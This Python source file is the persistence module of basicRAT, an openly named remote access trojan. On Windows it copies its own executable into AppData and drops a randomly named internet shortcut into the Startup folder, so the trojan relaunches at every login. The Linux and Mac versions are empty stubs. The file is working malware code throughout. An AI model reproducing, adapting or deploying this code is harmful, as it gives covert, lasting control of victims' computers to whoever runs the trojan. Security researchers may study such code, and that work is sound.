#
# basicRAT persistence module
# https://github.com/vesche/basicRAT
#

import sys

def windows_persistence():
    import os, string, random
    try:
        appdata = os.path.expandvars("%AppData%")
        target = appdata + "\desktop.exe"

        if sys.executable == target:
            return True, "already added to start"

        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(appdata):
            with open(sys.executable, "rb") as f1:
                with open(target, "wb") as f2:
                    f2.write(f1.read())

            if os.path.exists(startup_dir):
                random_name = ''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(2,4))])
                persistence_file = os.path.join(startup_dir, '%s.desktop.url' % random_name)

                content = '\n[InternetShortcut]\nURL=file:///%s\n' % target

                f = open(persistence_file, 'w')
                f.write(content)
                f.close()
            
                return True, 'startup file add success'
            else:
                return False, 'startup file add failed'

    except WindowsError:
        return False, 'startup file add failed'


def linux_persistence():
    return False, 'nothing here yet'


def mac_persistence():
    return False, 'nothing here yet'


def run(plat):
    if plat == 'win':
        success, details = windows_persistence()
    elif plat == 'nix':
        success, details = linux_persistence()
    elif plat == 'mac':
        success, details = mac_persistence()
    else:
        return 'Error, platform unsupported.'

    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results
